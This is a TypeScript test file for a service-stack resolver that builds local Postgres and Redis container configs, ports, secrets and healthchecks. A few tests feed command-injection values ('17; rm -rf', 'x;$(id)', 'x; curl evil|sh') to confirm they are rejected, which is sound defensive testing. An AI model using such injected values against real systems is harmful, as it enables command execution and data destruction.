import { describe, expect, test } from "bun:test";
import type { StateFile } from "../../ports/state.port";
import { createEmptyState } from "../../ports/state.port";
import {
	builtinTestDefinitions,
	createGlobalStack,
	createProjectStack,
	postgresDefinition,
} from "../../testing/catalog-fixtures";
import {
	FakePortProbe,
	FixedClock,
	InMemorySecretStore,
	InMemoryStateStore,
	SequentialSecretGenerator,
} from "../../testing/fakes";
import { provisionStack } from "../provision";
import { resolveStack } from "../resolver";

const secrets = {
	POSTGRES_PASSWORD: "pg-secret-value-123",
	REDIS_PASSWORD: "redis-secret-value-456",
	SRH_TOKEN: "srh-token-value-789",
};

function pinned(stack: string, ports: Record<string, number>): StateFile {
	return {
		projects: [],
		stacks: { [stack]: { ports, createdAt: "2026-01-01T00:00:00Z" } },
	};
}

describe("resolveStack", () => {
	test("evaluates templates, config defaults and user overrides", () => {
		const stack = createProjectStack("sovr", {
			postgres: { version: "16", config: { POSTGRES_USER: "app" } },
		});
		const result = resolveStack({
			stack,
			definitions: builtinTestDefinitions,
			state: pinned("sovr", { postgres: 5433 }),
			secrets,
		});
		if (!result.ok) throw result.error;
		const [pg] = result.value.services;
		expect(result.value.projectName).toBe("li-sovr");
		expect(result.value.network).toBe("li-sovr");
		expect(pg).toMatchObject({
			id: "postgres",
			catalogId: "postgres",
			version: "16",
			image: "postgres:16-alpine",
			hostPort: 5433,
			containerPort: 5432,
			config: { POSTGRES_USER: "app", POSTGRES_DB: "sovr" },
			secrets: { POSTGRES_PASSWORD: secrets.POSTGRES_PASSWORD },
			env: {
				POSTGRES_USER: "app",
				POSTGRES_PASSWORD: secrets.POSTGRES_PASSWORD,
				POSTGRES_DB: "sovr",
			},
			exports: {
				DATABASE_URL: `postgres://app:${secrets.POSTGRES_PASSWORD}@127.0.0.1:5433/sovr`,
				PGHOST: "127.0.0.1",
				PGPORT: "5433",
			},
			volumes: [
				{ name: "li-sovr-postgres-data", path: "/var/lib/postgresql/data" },
			],
			dependsOn: [],
			healthcheck: {
				test: ["CMD", "pg_isready", "-U", "app", "-d", "sovr"],
				interval: "5s",
				retries: 10,
			},
		});
		expect(pg?.command).toBeUndefined();
	});

	test("dependency context exposes port, config and secrets of dependsOn", () => {
		const stack = createProjectStack("app", { "upstash-redis": {}, redis: {} });
		const result = resolveStack({
			stack,
			definitions: builtinTestDefinitions,
			state: pinned("app", { redis: 6380, "upstash-redis": 8080 }),
			secrets,
		});
		if (!result.ok) throw result.error;
		expect(result.value.services.map((s) => s.id)).toEqual([
			"redis",
			"upstash-redis",
		]);
		const [redis, upstash] = result.value.services;
		expect(redis?.command).toEqual([
			"redis-server",
			"--requirepass",
			secrets.REDIS_PASSWORD,
			"--appendonly",
			"yes",
		]);
		expect(upstash?.env.SRH_CONNECTION_STRING).toBe(
			`redis://:${secrets.REDIS_PASSWORD}@redis:6379`,
		);
		expect(upstash?.dependsOn).toEqual(["redis"]);
	});

	test("global stack falls back to canonical ports without state", () => {
		const result = resolveStack({
			stack: createGlobalStack({ postgres: {} }),
			definitions: builtinTestDefinitions,
			state: createEmptyState(),
			secrets,
		});
		if (!result.ok) throw result.error;
		expect(result.value.services[0]?.hostPort).toBe(5432);
		expect(result.value.kind).toBe("global");
	});

	test("unprovisioned port or secret is INVALID_STACK with a fix hint", () => {
		const noPort = resolveStack({
			stack: createProjectStack("app", { postgres: {} }),
			definitions: builtinTestDefinitions,
			state: createEmptyState(),
			secrets,
		});
		expect(noPort.ok).toBe(false);
		if (!noPort.ok) {
			expect(noPort.error.code).toBe("INVALID_STACK");
			expect(noPort.error.details.reason).toBe("unprovisioned");
		}
		const noSecret = resolveStack({
			stack: createProjectStack("app", { postgres: { port: 5500 } }),
			definitions: builtinTestDefinitions,
			state: createEmptyState(),
			secrets: {},
		});
		expect(noSecret.ok).toBe(false);
		if (!noSecret.ok) {
			expect(noSecret.error.details.reason).toBe("unprovisioned");
			expect(noSecret.error.message).not.toContain("pg-secret");
		}
	});

	test("rejects unknown config keys and invalid versions", () => {
		const base = {
			definitions: builtinTestDefinitions,
			state: pinned("app", { postgres: 5433 }),
			secrets,
		};
		const badConfig = resolveStack({
			...base,
			stack: createProjectStack("app", { postgres: { config: { NOPE: "x" } } }),
		});
		expect(badConfig.ok).toBe(false);
		if (!badConfig.ok) expect(badConfig.error.code).toBe("INVALID_STACK");
		const badVersion = resolveStack({
			...base,
			stack: createProjectStack("app", { postgres: { version: "17; rm -rf" } }),
		});
		expect(badVersion.ok).toBe(false);
		if (!badVersion.ok) expect(badVersion.error.code).toBe("INVALID_STACK");
	});

	test("unresolved templates are INVALID_CATALOG without leaking values", () => {
		const broken = {
			...postgresDefinition,
			exports: { URL: "{{secrets.POSTGRES_PASSWORD}}{{config.MISSING}}" },
		};
		const result = resolveStack({
			stack: createProjectStack("app", { postgres: {} }),
			definitions: [broken],
			state: pinned("app", { postgres: 5433 }),
			secrets,
		});
		expect(result.ok).toBe(false);
		if (!result.ok) {
			expect(result.error.code).toBe("INVALID_CATALOG");
			expect(result.error.details.paths).toEqual(["config.MISSING"]);
			expect(result.error.message).not.toContain(secrets.POSTGRES_PASSWORD);
		}
	});
});

describe("provisionStack", () => {
	test("allocates, generates and resolves in one pass", async () => {
		const state = new InMemoryStateStore();
		const store = new InMemorySecretStore({
			app: { REDIS_PASSWORD: "kept-redis-secret" },
		});
		const gen = new SequentialSecretGenerator();
		const result = await provisionStack(
			{
				state,
				secrets: store,
				probe: new FakePortProbe([6380]),
				gen,
				clock: new FixedClock(),
			},
			createProjectStack("app", { redis: {}, "upstash-redis": {} }),
			builtinTestDefinitions,
		);
		if (!result.ok) throw result.error;
		const [redis, upstash] = result.value.services;
		expect(redis?.hostPort).toBe(6381);
		expect(redis?.secrets.REDIS_PASSWORD).toBe("kept-redis-secret");
		expect(upstash?.hostPort).toBe(8080);
		expect(upstash?.secrets.SRH_TOKEN).toStartWith("secret-1-");
		expect(gen.count).toBe(1);
		expect(state.state.stacks.app?.ports).toEqual({
			redis: 6381,
			"upstash-redis": 8080,
		});
	});
});

describe("resolveStack config patterns", () => {
	const resolveWith = (config: Record<string, string>) =>
		resolveStack({
			stack: createProjectStack("sovr", { postgres: { config } }),
			definitions: builtinTestDefinitions,
			state: pinned("sovr", { postgres: 5433 }),
			secrets,
		});

	test("values that would break or inject into the healthcheck are INVALID_STACK", () => {
		const bad: Record<string, string>[] = [
			{ POSTGRES_DB: "my db" },
			{ POSTGRES_USER: "x;$(id)" },
			{ POSTGRES_DB: "x; curl evil|sh" },
			{ POSTGRES_USER: "a@b/c" },
		];
		for (const config of bad) {
			const result = resolveWith(config);
			expect(result.ok).toBe(false);
			if (!result.ok) {
				expect(result.error.code).toBe("INVALID_STACK");
				expect(String(result.error.details.fix)).toContain("config.");
			}
		}
	});

	test("ordinary names pass and reach the healthcheck as separate argv items", () => {
		const result = resolveWith({
			POSTGRES_USER: "app_user",
			POSTGRES_DB: "my-db",
		});
		if (!result.ok) throw result.error;
		expect(result.value.services[0]?.healthcheck?.test).toEqual([
			"CMD",
			"pg_isready",
			"-U",
			"app_user",
			"-d",
			"my-db",
		]);
	});
});
